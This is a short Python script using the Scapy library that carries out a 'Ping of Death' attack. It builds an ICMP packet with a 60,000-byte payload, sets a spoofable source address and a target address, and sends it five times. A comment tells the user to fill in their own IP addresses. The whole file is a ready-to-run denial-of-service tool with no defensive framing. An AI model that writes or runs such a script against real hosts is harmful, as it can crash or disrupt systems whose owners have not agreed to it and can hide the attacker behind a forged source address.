#!/usr/bin/python

from scapy.all import *

# Change according with your IP addresses
SOURCE_IP="10.0.1.1"
TARGET_IP="10.0.1.5"
MESSAGE="T"
NUMBER_PACKETS=5 # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)
